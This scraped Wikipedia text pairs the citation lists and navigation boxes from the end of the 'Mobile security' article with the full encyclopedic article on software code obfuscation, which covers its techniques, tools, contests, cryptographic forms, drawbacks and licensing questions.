Michael SW Lee; Ian Soon (2017-06-13). "Taking a bite out of Apple: Jailbreaking and the confluence of brand loyalty, consumer resistance and the co-creation of value". 
Journal of Product & Brand Management
. 
26
 (4): 351–364. 
doi
:
10.1108/JPBM-11-2015-1045
. 
ISSN
 
1061-0421
.




^ 
a
 
b
 
c
 
d
 
e
 
f
 
Leavitt, Neal (2011). "Mobile Security: Finally a Serious Problem?". 
Computer
. 
44
 (6): 11–14. 
doi
:
10.1109/MC.2011.184
. 
S2CID
 
19895938
.




^ 
a
 
b
 
Bishop 2004
.




^
 
Olson, Parmy (26 August 2013). 
"Your smartphone is hackers' next big target"
. CNN
. Retrieved 
August 26,
 2013
.




^ 
a
 
b
 
"Guide on Protection Against Hacking"
 
(PDF)
. Mauritius National Computer Board. Archived from 
the original
 
(PDF)
 on 2012-11-17.




^
 
Lemos, Robert. 
"New laws make hacking a black-and-white choice"
. CNET News.com
. Retrieved 
September 23,
 2002
.




^
 
McCaney, Kevin (7 May 2012). 
"
'Unknowns' hack NASA, Air Force, saying 'We're here to help'
"
. Archived from 
the original
 on 2021-01-26
. Retrieved 
May 7,
 2012
.




^
 
Bilton 2010
.




^ 
a
 
b
 
c
 
d
 
e
 
Guo, Wang & Zhu 2004
, p. 3.




^
 
Dagon, Martin & Starder 2004
, p. 12.




^ 
a
 
b
 
Dixon & Mishra 2010
, p. 3.




^ 
a
 
b
 
c
 
d
 
e
 
f
 
g
 
h
 
Töyssy & Helenius 2006
, p. 113.




^
 
Siemens 2010
, p. 1.




^
 
Gendrullis 2008
, p. 266.




^
 
European Telecommunications Standards Institute 2011
, p. 1.




^
 
Jøsang, Miralabé & Dallot 2015
.




^
 
Gittleson, Kim (2014-03-28). 
"Data-stealing Snoopy drone unveiled at Black Hat"
. 
BBC News
. Retrieved 
2023-10-27
.




^ 
a
 
b
 
Töyssy & Helenius 2006
, p. 27.




^
 
Mulliner 2006
, p. 113.




^
 
Dunham, Abu Nimeh & Becher 2008
, p. 225.




^ 
a
 
b
 
Suarez-Tangil, Guillermo; Juan E. Tapiador; Pedro Peris-Lopez; Arturo Ribagorda (2014). 
"Evolution, Detection and Analysis of Malware in Smart Devices"
 
(PDF)
. 
IEEE Communications Surveys & Tutorials
. 
16
 (2): 961–987. 
doi
:
10.1109/SURV.2013.101613.00077
. 
S2CID
 
5627271
. Archived from 
the original
 
(PDF)
 on 2017-10-31
. Retrieved 
2013-11-11
.




^
 
Ng, Alfred. 
"Your smartphones are getting more valuable for hackers"
. 
CNET
. Retrieved 
2021-03-04
.




^ 
a
 
b
 
c
 


Aviv, Adam J.; Gibson, Katherine; Mossop, Evan; Blaze, Matt; Smith, Jonathan M. 
Smudge Attacks on Smartphone Touch Screens
 
(PDF)
. 
4th USENIX Workshop on Offensive Technologies
.




^ 
a
 
b
 
Hamilton, Keegan (July 11, 2018). 
"El Chapo's lawyers want to suppress evidence from spyware used to catch cheating spouses"
. 
Vice Media
. 
The Thailand-based FlexiSPY bills itself as "the world's most powerful monitoring software," and the company's website lists prospective buyers as concerned parents who want to spy on their kids and companies interested in snooping on their employees. But the app has also been dubbed "stalkerware" because it was initially marketed to jealous spouses paranoid about infidelity.




^ 
a
 
b
 
Becher 2009
, p. 65.




^
 
Becher 2009
, p. 66.




^
 
Diogenes, Yuri (2019). 
Cybersecurity - Attack and Defense Strategies - Second Edition
. Erdal Ozkaya, Safari Books Online (2nd ed.). Packt. p. 163. 
ISBN
 
978-1-83882-779-3
. 
OCLC
 
1139764053
.




^ 
a
 
b
 
c
 
Schmidt et al. 2009a
, p. 3.




^
 
"Eloqua - Error Information"
 
(PDF)
. Archived from 
the original
 
(PDF)
 on 2021-10-09.




^
 
"Study reveals scale of data-sharing from Android mobile phones"
. 
Trinity College Dublin
. Retrieved 
16 November
 2021
.




^
 
Liu, Haoyu; Patras, Paul; Leith, Douglas J. (6 October 2021). 
"Android Mobile OS Snooping By Samsung, Xiaomi, Huawei and Realme Handsets"
 
(PDF)
. Retrieved 
16 November
 2021
.




^
 
"NetGuard FAQ"
. 
GitHub
. 4 November 2022
. Retrieved 
4 November
 2022
.




^
 
Becher 2009
, p. 87.




^
 
Becher 2009
, p. 88.




^
 
Mickens & Noble 2005
, p. 1.




^
 
Raboin 2009
, p. 272.




^
 
Töyssy & Helenius 2006
, p. 114.




^
 
Haas, Peter D. (2015). 
Ransomware goes mobile: An analysis of the threats posed by emerging methods
 (Thesis). Utica College. Archived from 
the original
 on 2016-02-24.




^
 
"What is Pegasus spyware and how does it hack phones?"
. 
The Guardian
. 18 July 2021
. Retrieved 
13 August
 2021
.




^
 
Becher 2009
, p. 91-94.




^ 
a
 
b
 
c
 
d
 
e
 
Becher 2009
, p. 12.




^ 
a
 
b
 
Schmidt et al. 2008
, p. 5-6.




^
 
Halbronn & Sigwald 2010
, p. 5-6.




^
 
Ruff 2011
, p. 127.




^
 
Hogben & Dekker 2010
, p. 50.




^
 
Schmidt et al. 2008
, p. 50.




^ 
a
 
b
 
c
 
Shabtai et al. 2009
, p. 10.




^
 
Becher 2009
, p. 31.




^
 
Schmidt et al. 2008
, p. 3.




^
 
Shabtai et al. 2009
, p. 7-8.




^
 
Pandya 2008
, p. 15.




^
 
Becher 2009
, p. 22.




^
 
Becher et al. 2011
, p. 96.




^
 
Becher 2009
, p. 128.




^
 
Becher 2009
, p. 140.




^
 
Thirumathyam & Derawi 2010
, p. 1.




^
 
Schmidt et al. 2008
, p. 7-12.




^
 
Becher 2009
, p. 126.




^
 
Malik 2016
, p. 28.




^
 
Vaughan-Nichols, Steven J. 
"Google Tensor chip: Everything we know so far"
. 
ZDNet
.




^
 
"The Titan M Chip Powers Up Pixel 3 Security"
. 
Wired
.




^
 
Becher et al. 2011
, p. 101.




^ 
a
 
b
 
Ruff 2011
, p. 11.




^ 
a
 
b
 
Hogben & Dekker 2010
, p. 45.




^ 
a
 
b
 
Becher 2009
, p. 13.




^
 
Becher 2009
, p. 34.




^
 
Ruff 2011
, p. 7.




^
 
Mylonas, Alexios; Kastania, Anastasia; Gritzalis, Dimitris (2013). "Delegate the smartphone user? Security awareness in smartphone platforms". 
Computers & Security
. 
34
: 47–66. 
CiteSeerX
 
10.1.1.717.4352
. 
doi
:
10.1016/j.cose.2012.11.004
.




^
 
Hogben & Dekker 2010
, p. 46-48.




^
 
Ruff 2011
, p. 7-8.




^
 
Shabtai et al. 2009
, p. 8-9.




^
 
Hogben & Dekker 2010
, p. 43.




^
 
Hogben & Dekker 2010
, p. 47.




^
 
Hogben & Dekker 2010
, p. 43-45.




^
 
Charlie Sorrel (2010-03-01). 
"TigerText Deletes Text Messages From Receiver's Phone"
. 
Wired
. 
Archived
 from the original on 2010-08-26
. Retrieved 
2010-03-02
.




^
 
Becher 2009
, p. 40.




^
 
Gupta 2016
, p. 461.






References
[
edit
]


Books
[
edit
]




Bishop, Matt (2004). 
Introduction to Computer Security
. Addison Wesley Professional. 
ISBN
 
978-0-321-24744-5
.


Dunham, Ken; Abu Nimeh, Saeed; Becher, Michael (2008). 
Mobile Malware Attack and Defense
. Syngress Media. 
ISBN
 
978-1-59749-298-0
.


Furnell, Steven (2009). 
Mobile Security
. Itgp. 
ISBN
 
978-1-84928-021-1
.


Rogers, David (2013). 
Mobile Security: A Guide for Users
. Copper Horse Solutions Limited. 
ISBN
 
978-1-291-53309-5
.




Articles
[
edit
]




Becher, Michael (2009). 
Security of Smartphones at the Dawn of Their Ubiquitousness
 
(PDF)
 (Dissertation). Mannheim University.


Becher, Michael; Freiling, Felix C.; Hoffmann, Johannes; Holz, Thorsten; Uellenbeck, Sebastian; Wolf, Christopher (May 2011). 
Mobile Security Catching Up? Revealing the Nuts and Bolts of the Security of Mobile Devices
 
(PDF)
. 2011 IEEE Symposium on Security and Privacy. pp. 96–111. 
doi
:
10.1109/SP.2011.29
. 
ISBN
 
978-1-4577-0147-4
.


Bilton, Nick (26 July 2010). 
"Hackers With Enigmatic Motives Vex Companies"
. 
The New York Times
. p. 5.


Cai, Fangda; Chen, Hao; Wu, Yuanyi; Zhang, Yuan (2015). 
AppCracker: Widespread Vulnerabilities in Userand Session Authentication in Mobile Apps
 
(PDF)
 (Dissertation). University of California, Davis.


Crussell, Johnathan; Gibler, Clint; Chen, Hao (2012). 
Attack of the Clones: Detecting Cloned Applications on Android Markets
 
(PDF)
 (Dissertation). University of California, Davis.


Dagon, David; Martin, Tom; Starder, Thad (October–December 2004). "Mobile Phones as Computing Devices: The Viruses are Coming!". 
IEEE Pervasive Computing
. 
3
 (4): 11. 
doi
:
10.1109/MPRV.2004.21
. 
S2CID
 
14224399
.


Dixon, Bryan; Mishra, Shivakant (June–July 2010). 
On and Rootkit and Malware Detection in Smartphones
 
(PDF)
. 2010 International Conference on Dependable Systems and Networks Workshops (DSN-W). 
ISBN
 
978-1-4244-7728-9
.


Gendrullis, Timo (November 2008). 
A real-world attack breaking A5/1 within hours
. Proceedings of CHES '08. Springer. pp. 266–282. 
doi
:
10.1007/978-3-540-85053-3_17
.


Gupta, Sugandha (2016). 
Vulnebdroid: Automated Vulnerability Score Calculator for Android Applications
. International Symposium on Security in Computing and Communication. Springer. 
doi
:
10.1007/978-981-10-2738-3_40
.


Guo, Chuanxiong; Wang, Helen; Zhu, Wenwu (November 2004). 
Smart-Phone Attacks and Defenses
 
(PDF)
. ACM SIGCOMM HotNets. Association for Computing Machinery, Inc
. Retrieved 
March 31,
 2012
.


Halbronn, Cedric; Sigwald, John (2010). 
Vulnerabilities & iPhone Security Model
 
(PDF)
. HITB SecConf 2010. Archived from 
the original
 
(PDF)
 on 2013-02-02
. Retrieved 
2012-04-21
.


Hogben, Giles; Dekker, Marnix (December 2010). 
"Smartphones: Information security Risks, Opportunities and Recommendations for users"
. 
ENISA
.


Jøsang, Audun; Miralabé, Laurent; Dallot, Léonard (2015). 
"Vulnerability by Design in Mobile Network Security"
 
(PDF)
. 
Journal of Information Warfare (JIF)
. 
14
 (4). 
ISSN
 
1445-3347
.


Malik, Jyoti (2016). 
CREDROID: Android malware detection by network traffic analysis
. Proceedings of the 1st ACM Workshop on Privacy-Aware Mobile Computing. Association for Computing Machinery, Inc. pp. 28–36. 
doi
:
10.1145/2940343.2940348
.


Mickens, James W.; Noble, Brian D. (2005). 
Modeling epidemic spreading in mobile environments
. WiSe '05 Proceedings of the 4th ACM workshop on Wireless security. Association for Computing Machinery, Inc. pp. 77–86. 
doi
:
10.1145/1080793.1080806
.


Mulliner, Collin Richard (2006). 
Security of Smart Phones
 
(PDF)
 (M.Sc. thesis). University of California, Santa Barbara.


Pandya, Vaibhav Ranchhoddas (2008). 
Iphone Security Analysis
 
(PDF)
 (Thesis). San Jose State University.


Raboin, Romain (December 2009). 
La sécurité des smartphones
 
(PDF)
. 
Symposium sur la sécurité des technologies de l'information et des communications 2009. SSTIC09
 (in French).


Racic, Radmilo; Ma, Denys; Chen, Hao (2006). 
Exploiting MMS Vulnerabilities to Stealthily Exhaust Mobile Phone's Battery
 
(PDF)
 (Dissertation). University of California, Davis.


Roth, Volker; Polak, Wolfgang; Rieffel, Eleanor (2008). 
Simple and Effective Defense Against Evil Twin Access Points
. ACM SIGCOMM HotNets. 
doi
:
10.1145/1352533.1352569
. 
ISBN
 
978-1-59593-814-5
.


Ruff, Nicolas (2011). 
Sécurité du système Android
 
(PDF)
. 
Symposium sur la sécurité des technologies de l'information et des communications 2011. SSTIC11
 (in French).


Ruggiero, Paul; Foote, Jon (2011). 
Cyber Threats to Mobile Phones
 
(PDF)
 (thesis). US-CERT.


Schmidt, Aubrey-Derrick; Schmidt, Hans-Gunther; Clausen, Jan; Yüksel, Kamer Ali; Kiraz, Osman; Camtepe, Ahmet; Albayrak, Sahin (October 2008). 
Enhancing Security of Linux-based Android Devices
 
(PDF)
. Proceedings of 15th International Linux Kongress.


Schmidt, Aubrey-Derrick; Schmidt, Hans-Gunther; Batyuk, Leonid; Clausen, Jan Hendrik; Camtepe, Seyit Ahmet; Albayrak, Sahin (April 2009a). 
Smartphone Malware Evolution Revisited: Android Next Target?
 
(PDF)
. 4th International Conference on Malicious and Unwanted Software (MALWARE). 
ISBN
 
978-1-4244-5786-1
. Retrieved 
2010-11-30
.


Shabtai, Asaf; Fledel, Yuval; Kanonov, Uri; Elovici, Yuval; Dolev, Shlomi (2009). "Google Android: A State-of-the-Art Review of Security Mechanisms". 
arXiv
:
0912.5101v1
 [
cs.CR
].


Thirumathyam, Rubathas; Derawi, Mohammad O. (2010). 
Biometric Template Data Protection in Mobile Device Using Environment XML-database
. 2010 2nd International Workshop on Security and Communication Networks (IWSCN). 
ISBN
 
978-1-4244-6938-3
. Archived from 
the original
 on 2013-02-12.


Töyssy, Sampo; Helenius, Marko (2006). "About malicious software in smartphones". 
Journal in Computer Virology
. 
2
 (2): 109–119. 
doi
:
10.1007/s11416-006-0022-0
. 
S2CID
 
9760466
.


Websites
[
edit
]


European Telecommunications Standards Institute (2011). 
"3GPP Confidentiality and Integrity Algorithms & UEA1 UIA1"
. Archived from 
the original
 on 12 May 2012.


Siemens (2010). 
"Series M Siemens SMS DoS Vulnerability"
.




Further reading
[
edit
]




"Sécurisation de la mobilité"
 
(PDF)
. 
CIGREF
 (in French). October 2010.


Chong, Wei Hoo (November 2007). 
iDEN Smartphone Embedded Software Testing
 
(PDF)
. Fourth International Conference on Information Technology, 2007. ITNG '07. 
doi
:
10.1109/ITNG.2007.103
. 
ISBN
 
978-0-7695-2776-5
.


Jansen, Wayne; Scarfone, Karen (October 2008). 
"Guidelines on Cell Phone and PDA Security: Recommendations of the National Institute of Standards and Technology"
 
(PDF)
. 
National Institute of Standards and Technology
. 
doi
:
10.6028/NIST.SP.800-124
. Retrieved 
April 21,
 2012
.


Murugiah P. Souppaya; Scarfone, Karen (June 21, 2013). 
"Guidelines for Managing the Security of Mobile Devices in the Enterprisewebsite=National Institute of Standards and Technology"
. 
NIST
. 
doi
:
10.6028/NIST.SP.800-124r1
.


Lee, Sung-Min; Suh, Sang-bum; Jeong, Bokdeuk; Mo, Sangdok (January 2008). 
A Multi-Layer Mandatory Access Control Mechanism for Mobile Devices Based on Virtualization
. 5th IEEE Consumer Communications and Networking Conference, 2008. CCNC 2008. 
doi
:
10.1109/ccnc08.2007.63
. 
ISBN
 
978-1-4244-1456-7
.


Li, Feng; Yang, Yinying; Wu, Jie (March 2010). 
CPMC: An Efficient Proximity Malware Coping Scheme in Smartphone-based Mobile Networks
 
(PDF)
. INFOCOM, 2010 Proceedings IEEE. 
doi
:
10.1109/INFCOM.2010.5462113
.


Ni, Xudong; Yang, Zhimin; Bai, Xiaole; Champion, Adam C.; Xuan, Dong (October 2009). 
Distribute: Differentiated User Access Control on Smartphones
. 6th IEEE International Conference on Mobile Adhoc and Periodic Sensor Systems, 2009. MASS '09. 
ISBN
 
978-1-4244-5113-5
.


Ongtang, Machigar; McLaughlin, Stephen; Enck, William; Mcdaniel, Patrick (December 2009). 
Semantically Rich Application-Centric Security in Android
 
(PDF)
. Annual Computer Security Applications Conference, 2009. ACSAC '09. 
Annual Computer Security Applications Conference (Acsac)
. 
ISSN
 
1063-9527
.


Schmidt, Aubrey-Derrick; Bye, Rainer; Schmidt, Hans-Gunther; Clausen, Jan; Kiraz, Osman; Yüksel, Kamer A.; Camtepe, Seyit A.; Albayrak, Sahin (2009b). 
Static Analysis of Executables for Collaborative Malware Detection on Android
 
(PDF)
. IEEE International Conference Communications, 2009. ICC '09. 
Communications, 2009. Icc '09. IEEE International Conference on
. 
ISSN
 
1938-1883
.


Yang, Feng; Zhou, Xuehai; Jia, Gangyong; Zhang, Qiyuan (2010). 
A Non-cooperative Game Approach for Intrusion Detection Systems in Smartphone systems
. 8th Annual Communication Networks and Services Research Conference. 
doi
:
10.1109/CNSR.2010.24
. 
ISBN
 
978-1-4244-6248-3
.




v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation




v
t
e
Mobile phones
Mobile
networks
,
protocols


Channel capacity


Frequencies


Multi-band


Network operator


list


Roaming


Signal


SIM card


dual SIM


eSIM


SIM lock


Standards comparison


Tethering


VoIP


WAP


XHTML-MP


Generations


Analogue
:


0G


1G


Digital
:


2G


3G


adoption


3.5G


4G


4.5G


5G


6G


General
operation


Features


GSM


services


History


Operating system


Security


phone cloning


Telephony


airplane mode


Text messaging


SMS


MMS


RCS


Spam


Tracking


Web browsing


Mobile
devices


Manufacturers


3D phone


Camera phone


Car phone


Feature phone


Projector phone


Satellite phone


Smartphone


Form factors


Bar


Flip


Phablet


Slider


Slate


Smartwatch


Fold


Smartphones


Android devices


rooting


BlackBerry 10


iPhone


iOS jailbreaking


Open-source mobile phones


Symbian devices


Windows Phone devices


Mobile
specific
software
Apps


Development


Distribution


Management


Cloud computing


Commerce


Banking


Marketing


advertising


campaigns


Payments


contactless


donating


Ticketing


Content


Blogging


Email


Gambling


Gaming


Health


Instant messaging


Learning


Music


News


Search


local


Social


address book


Television


Culture


Box breaking


Charms


Comics


Dating


Japanese culture


Novels


Ringtones


silent mode


Selfie


Txt-spk


Wallpaper


Environment
and health


BlackBerry thumb


Driving safety


Electronic waste


External power supply


Mental health from overuse


Phantom vibration syndrome


Radiation and health


Recycling


Law


Carrier IQ


Legality of recording by civilians


Mobile phones in prison


Photography and the law


Telephone tapping


Texting while driving


USA use restrictions while driving




 
Telecommunication portal


 
Telephones portal


 
Category




v
t
e
Malware
 topics
Infectious malware


Comparison of computer viruses


Computer virus


Computer worm


List of computer worms


Timeline of computer viruses and worms


Concealment


Backdoor


Clickjacking


Man-in-the-browser


Man-in-the-middle


Rootkit


Trojan horse


Zombie computer


Malware for profit


Adware


Botnet


Crimeware


Fleeceware


Form grabbing


Fraudulent dialer


Infostealer


Keystroke logging


Malbot


Privacy-invasive software


Ransomware


Rogue security software


Scareware


Spyware


Web threats


By operating system


Android malware


Classic Mac OS viruses


iOS malware


Linux malware


MacOS malware


Macro virus


Mobile malware


Palm OS viruses


HyperCard viruses


Protection


Anti-keylogger


Antivirus software


Browser security


Data loss prevention software


Defensive computing


Firewall


Internet security


Intrusion detection system


Mobile security


Network security


Countermeasures


Computer and network surveillance


Honeypot


Operation: Bot Roast












Retrieved from "
https://en.wikipedia.org/w/index.php?title=Mobile_security&oldid=1245528484
"


Category
: 
Mobile security
Hidden categories: 
Articles with short description
Short description is different from Wikidata
All articles with unsourced statements
Articles with unsourced statements from October 2023
Articles needing additional references from October 2023
All articles needing additional references
All articles with vague or ambiguous time
Vague or ambiguous time from March 2023
Wikipedia articles needing clarification from October 2023
Articles with unsourced statements from March 2023
All articles with specifically marked weasel-worded phrases
Articles with specifically marked weasel-worded phrases from March 2023
All articles with failed verification
Articles with failed verification from October 2023
Articles needing additional references from November 2022
Articles with unsourced statements from February 2017
Articles with unsourced statements from April 2012
All articles with incomplete citations
Articles with incomplete citations from March 2023
CS1 French-language sources (fr)











From Wikipedia, the free encyclopedia






For the term as used in natural language, see 
obfuscation
.






Deliberate creation of difficult-to-understand code




In 
software development
, 
obfuscation
 is the act of creating 
source
 or 
machine code
 that is difficult for humans or computers to understand. Like 
obfuscation
 in 
natural language
, it may use needlessly roundabout expressions to compose statements. Programmers may deliberately obfuscate code to conceal its purpose (
security through obscurity
) or its logic or implicit values embedded in it, primarily, in order to prevent tampering, deter 
reverse engineering
, or even to create a 
puzzle
 or recreational challenge for someone reading the source code. This can be done manually or by using an automated tool, the latter being the preferred technique in industry.
[
1
]






Overview
[
edit
]


The architecture and characteristics of some languages may make them easier to obfuscate than others.
[
2
]
[
3
]
 
C
,
[
4
]
 
C++
,
[
5
]
[
6
]
 and the 
Perl
 
programming language
[
7
]
 are some examples of languages easy to obfuscate. 
Haskell
 is also quite obfuscatable
[
8
]
 despite being quite different in structure.

The properties that make a language obfuscatable are not immediately obvious.



Techniques
[
edit
]


This section 
needs expansion
 with: explaining more obfuscation techniques in general. You can help by 
adding to it
.  
(
March 2023
)


Types of obfuscations include simple keyword substitution, use or non-use of whitespace to create artistic effects, and self-generating or heavily compressed programs.

According to 
Nick Montfort
, techniques may include: 



naming obfuscation, which includes naming variables in a meaningless or deceptive way;


data/code/comment confusion, which includes making some actual code look like comments or confusing syntax with data;


double coding, which can be displaying code in poetry form or interesting shapes.
[
9
]


Automated tools
[
edit
]


A variety of tools exist to perform or assist with code obfuscation. These include experimental research tools created by academics, hobbyist tools, commercial products written by professionals, and 
open-source software
. Deobfuscation tools also exist that attempt to perform the reverse transformation.

Although the majority of commercial obfuscation solutions work by transforming either program source code, or platform-independent bytecode as used by 
Java
 and 
.NET
, there are also some that work directly on compiled binaries.



Some 
Python
 examples can be found in the 
official Python programming FAQ
 and elsewhere.
[
10
]
[
11
]
[
12
]


The 
movfuscator
 
C
 
compiler
 for the 
x86_32 ISA
 uses only the 
mov
 instruction in order to obfuscate.
[
13
]
[
14
]
[
15
]


Recreational
[
edit
]


Writing and reading obfuscated source code can be a 
brain teaser
. A number of programming contests reward the most creatively obfuscated code, such as the 
International Obfuscated C Code Contest
 and the 
Obfuscated Perl Contest
.

Short obfuscated 
Perl
 programs may be used in 
signatures
 of Perl programmers.  These are JAPHs ("
Just another Perl hacker
").
[
16
]




Cryptographic
[
edit
]


Further information: 
Indistinguishability obfuscation
 and 
Black-box obfuscation


Cryptographers have explored the idea of obfuscating code so that reverse-engineering the code is 
cryptographically
 hard. This is formalized in the many proposals for 
indistinguishability obfuscation
, a cryptographic primitive that, if possible to build securely, would allow one to construct many other kinds of cryptography, including completely novel types that no one knows how to make. (A stronger notion, 
black-box obfuscation
, is known to be impossible in general.)
[
17
]
[
18
]




Disadvantages of obfuscation
[
edit
]


While obfuscation can make reading, writing, and reverse-engineering a program difficult and time-consuming, it will not necessarily make it impossible.
[
19
]


It adds time and complexity to the build process for the developers.


It can make debugging issues after the software has been obfuscated extremely difficult.


Once code is no longer maintained, hobbyists may want to maintain the program, add mods, or understand it better. Obfuscation makes it hard for end users to do useful things with the code.


Certain kinds of obfuscation (i.e. code that isn't just a local binary and downloads mini binaries from a web server as needed) can degrade performance and/or require Internet.


Notifying users of obfuscated code
[
edit
]


Some anti-virus softwares, such as 
AVG AntiVirus
,
[
20
]
 will also alert their users when they land on a website with code that is manually obfuscated, as one of the purposes of obfuscation can be to hide malicious code. However, some developers may employ code obfuscation for the purpose of reducing file size or increasing security. The average user may not expect their antivirus software to provide alerts about an otherwise harmless piece of code, especially from trusted corporations, so such a feature may actually deter users from using legitimate software.

Mozilla and Google disallow browser extensions containing obfuscated code in their add-ons store.
[
21
]
[
22
]




Obfuscation and copyleft licenses
[
edit
]


There has been debate on whether it is illegal to skirt 
copyleft
 
software licenses
 by releasing source code in obfuscated form, such as in cases in which the author is less willing to make the source code available. The issue is addressed in the 
GNU General Public License
 by requiring the "preferred form for making modifications" to be made available.
[
23
]
 The GNU website states "Obfuscated 'source code' is not real source code and does not count as source code."
[
24
]




Decompilers
[
edit
]


A 
decompiler
 can reverse-engineer source code from an executable or library. Decompilation is sometimes called a man-in-the-end (mite) attack, based on the traditional cryptographic attack known as "
man-in-the-middle
". It puts source code in the hands of the user, although this source code is often difficult to read. The source code is likely to have random function and variable names, incorrect variable types, and use different logic than the original source code (due to compiler optimizations).



Model obfuscation
[
edit
]


Model obfuscation
 is a technique to hide the internal structure of a 
machine learning
 model.
[
25
]
 Obfuscation turns a model into a black box. It is contrary to 
explainable AI
. Obfuscation models can also be applied to training data before feeding it into the model to add random noise. This hides sensitive information about the properties of individual and groups of samples.
[
26
]




See also
[
edit
]




AARD code


Spaghetti code


Decompilation


Esoteric programming language


Quine


Overlapping instructions


Polymorphic code


Hardware obfuscation


Underhanded C Contest


Source-to-source compiler


ProGuard (Java Obfuscator)


Dotfuscator (.Net Obfuscator)


Digital rights management


Indistinguishability obfuscation


Source code beautification




References
[
edit
]






^
 
"What is obfuscation (obfu)? - Definition from WhatIs.com"
. 
SearchSoftwareQuality
. 
Archived
 from the original on February 2, 2019
. Retrieved 
February 1,
 2019
.




^
 
Binstock, Andrew (March 6, 2003). 
"Obfuscation: Cloaking your Code from Prying Eyes"
. Archived from 
the original
 on April 20, 2008
. Retrieved 
November 25,
 2013
.




^
 
Atwood, Jeff (May 15, 2005). 
"Jeff Atwood, May 15, 2005"
. Codinghorror.com. Archived from 
the original
 on January 9, 2010
. Retrieved 
November 25,
 2013
.




^
 
"Obfuscation"
. Kenter.demon.nl. Archived from 
the original
 on March 4, 2016
. Retrieved 
November 25,
 2013
.




^
 
"C++ Tutorials – Obfuscated Code – A Simple Introduction"
. DreamInCode.net. 
Archived
 from the original on June 28, 2008
. Retrieved 
November 25,
 2013
.




^
 
"C Tutorials – Obfuscated Code in C"
. July 7, 2011. Archived from 
the original
 on December 27, 2013
. Retrieved 
November 25,
 2013
.




^
 
As of 2013-11-25 18:22 GMT. 
"Pe(a)rls in line noise"
. Perlmonks.org. 
Archived
 from the original on January 16, 2009
. Retrieved 
November 25,
 2013
.
{{
cite web
}}
:  CS1 maint: numeric names: authors list (
link
)




^
 
"Obfuscation – Haskell Wiki"
. February 16, 2006. 
Archived
 from the original on August 30, 2017
. Retrieved 
March 3,
 2020
.




^
 
Montfort, Nick. 
"Obfuscated code"
 
(PDF)
. Archived from 
the original
 
(PDF)
 on April 24, 2019
. Retrieved 
November 24,
 2017
.




^
 
Ben Kurtovic. 
"Obfuscating "Hello world!"
"
. 
benkurtovic.com
. 
Archived
 from the original on September 14, 2017
. Retrieved 
October 18,
 2017
.




^
 
"Obfuscated Python"
. 
wiki.c2.com
. 
Archived
 from the original on February 14, 2017
. Retrieved 
October 18,
 2017
.




^
 
"The First Annual Obfuscated Python Content"
. 
code.activestate.com
. Archived from 
the original
 on May 25, 2023
. Retrieved 
October 18,
 2017
.




^
 
domas (November 3, 2022), 
xoreaxeaxeax/movfuscator
, 
archived
 from the original on November 12, 2022
, retrieved 
November 5,
 2022




^
 
Break Me00 The MoVfuscator Turning mov into a soul crushing RE nightmare Christopher Domas
, 
archived
 from the original on October 21, 2022
, retrieved 
November 5,
 2022




^
 
Williams, Al (March 21, 2021). 
"One Instruction To Rule Them All: C Compiler Emits Only MOV"
. 
Hackaday
. Retrieved 
October 23,
 2023
.




^
 
"JAPH – Just Another Perl Hacker"
. 
pm.org
. Perl Mongers. Archived from 
the original
 on May 16, 2013
. Retrieved 
February 27,
 2015
.




^
 
"Cryptography Breakthrough Could Make Software Unhackable"
. 
Wired
. 
ISSN
 
1059-1028
. 
Archived
 from the original on April 14, 2022
. Retrieved 
March 14,
 2021
.




^
 
Jain, Aayush; 
Lin, Huijia
; Sahai, Amit (2020). 
"Indistinguishability Obfuscation from Well-Founded Assumptions"
. 
Cryptology ePrint Archive
. 
arXiv
:
2008.09317
. 
Archived
 from the original on March 3, 2022
. Retrieved 
March 14,
 2021
.




^
 
"
"Can We Obfuscate Programs?" by Boaz Barak"
. Math.ias.edu. Archived from 
the original
 on March 23, 2016
. Retrieved 
November 25,
 2013
.




^
 
"Blocking website and only way to fix is disabling HTTPS s... | AVG"
. 
support.avg.com
. July 21, 2020. 
Archived
 from the original on February 4, 2022
. Retrieved 
February 4,
 2022
.




^
 
at 05:01, Thomas Claburn in San Francisco 2 Oct 2018. 
"Google taking action against disguised code in Chrome Web Store"
. 
www.theregister.co.uk
. 
Archived
 from the original on November 12, 2019
. Retrieved 
November 12,
 2019
.
{{
cite web
}}
:  CS1 maint: numeric names: authors list (
link
)




^
 
Cimpanu, Catalin. 
"Mozilla announces ban on Firefox extensions containing obfuscated code"
. 
ZDNet
. 
Archived
 from the original on March 5, 2020
. Retrieved 
November 12,
 2019
.




^
 
"Reasoning behind the "preferred form of the work for making modifications to it" language in the GPL"
. Lwn.net. 
Archived
 from the original on December 2, 2013
. Retrieved 
November 25,
 2013
.




^
 
"What is free software?"
. gnu.org. 
Archived
 from the original on October 14, 2013
. Retrieved 
December 18,
 2014
.




^
 
Zhou, Mingyi; Gao, Xiang; Wu, Jing; Grundy, John C.; Chen, Xiao; Chen, Chunyang; Li, Li (2023). 
"Model Obfuscation for Securing Deployed Neural Networks"
.
 
{{
cite journal
}}
: 
Cite journal requires 
|journal=
 (
help
)




^
 
Zhang, Tianwei; He, Zecheng; Lee, Ruby B. (July 12, 2018). "Privacy-preserving Machine Learning through Data Obfuscation". 
arXiv
:
1807.01860
 [
cs.CR
].






Further reading
[
edit
]




Seyyedhamzeh, Javad, 
ABCME: A Novel Metamorphic Engine
